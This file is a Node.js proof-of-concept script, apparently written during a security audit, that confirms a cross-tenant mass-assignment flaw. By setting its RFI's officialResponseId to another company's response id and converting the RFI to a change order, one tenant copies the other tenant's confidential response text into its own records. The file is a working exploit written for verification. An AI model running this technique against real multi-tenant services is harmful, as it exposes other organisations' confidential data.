'use strict';
/**
 * L9 (D-04) — RFI officialResponseId mass-assignment copies another tenant's
 * RFI response body into a change order.
 *
 * Attacker: a PM of company 028 on their own project/RFI.
 * Victim:   company 042 — the body of one of its RFI responses.
 *
 * upgradeFields honours payload.officialResponseId with no validator in the
 * RFI routes (rfi.service.js :68; rfi.js upgradeValidators has no such field).
 * convertToChangeEvent then reads
 *   prisma.rfiResponse.findFirst({ where: { id: rfi.officialResponseId } })
 * with no rfiId / org scope (rfi-workflow.service.js :412) and puts
 * `official.body` into the change order description (:413).
 */
const { as } = require('../lib/api');
const { ATTACKER, VICTIM } = require('./_fib-constants');

const line = (s) => console.log(s);
const show = (label, res) => line(`${label} -> ${res.status} ${JSON.stringify(res.body?.error || res.body?.data?.id || '').slice(0, 160)}`);
const SECRET = `OLYMPUS-042-SECRET-${Date.now()} the specified grade is C50 not C40 and 042 will back-charge the client`;

(async () => {
  const atk = as(ATTACKER.pm, ATTACKER.orgId);
  const vic = as(VICTIM.pm, VICTIM.orgId);

  // ── Victim 042 writes a confidential RFI response ──
  const vRfi = await vic.send('POST', `/projects/${VICTIM.project}/rfi`, { subject: 'Olympus confidential RFI 042', question: 'internal only' });
  show('VICTIM POST rfi (042)', vRfi);
  const vRfiId = vRfi.body.data.id;
  const vResp = await vic.send('POST', `/projects/${VICTIM.project}/rfi/${vRfiId}/responses`, { body: SECRET });
  show('VICTIM POST response (042)', vResp);
  // addResponse returns the RFI detail; the RfiResponse row id lives in responses[].
  const vRespList = await vic.send('GET', `/projects/${VICTIM.project}/rfi/${vRfiId}/responses`);
  const victimResponseId = (vRespList.body.data.items || []).find((r) => r.body === SECRET).id;
  line(`Victim RfiResponse id = ${victimResponseId}`);

  // ── Attacker 028 raises its own RFI, then mass-assigns the foreign response id ──
  const aRfi = await atk.send('POST', `/projects/${ATTACKER.project}/rfi`, { subject: 'L9 cross-org response theft', question: 'probe', costImpact: true, costImpactAmount: 1000 });
  show('ATTACKER POST rfi (028)', aRfi);
  const aRfiId = aRfi.body.data.id;

  const patched = await atk.send('PATCH', `/projects/${ATTACKER.project}/rfi/${aRfiId}`, { officialResponseId: victimResponseId });
  show('ATTACKER PATCH {042 officialResponseId}', patched);

  const converted = await atk.send('POST', `/projects/${ATTACKER.project}/rfi/${aRfiId}/convert-to-change`, {});
  show('ATTACKER POST convert-to-change (028)', converted);
  const description = converted.body?.data?.changeOrder?.description || '';
  line(`change order description = ${JSON.stringify(description)}`);

  const leaked = converted.status === 201 && description.includes(SECRET);

  // cleanup (attacker side)
  if (converted.body?.data?.changeOrder?.id) {
    await atk.send('DELETE', `/projects/${ATTACKER.project}/change-orders/${converted.body.data.changeOrder.id}`).catch(() => {});
  }
  await atk.send('DELETE', `/projects/${ATTACKER.project}/rfi/${aRfiId}`).catch(() => {});

  process.exitCode = leaked ? 2 : 0;
  line('');
  line(`042's response body copied into 028's change order: ${leaked}`);
  process.exitCode = leaked ? 2 : 0;
  line(
    `VERDICT L9: ${leaked ? 'CONFIRMED' : 'NOT_REPRODUCED'} — ${
      leaked
        ? "a 028 PM set officialResponseId to a 042 RfiResponse id and convert-to-change embedded 042's confidential response body verbatim in 028's change order."
        : 'the foreign officialResponseId did not reach the change order description.'
    }`,
  );
})().catch((e) => {
  console.error('ERROR', e.message);
  process.exitCode = 1;
});
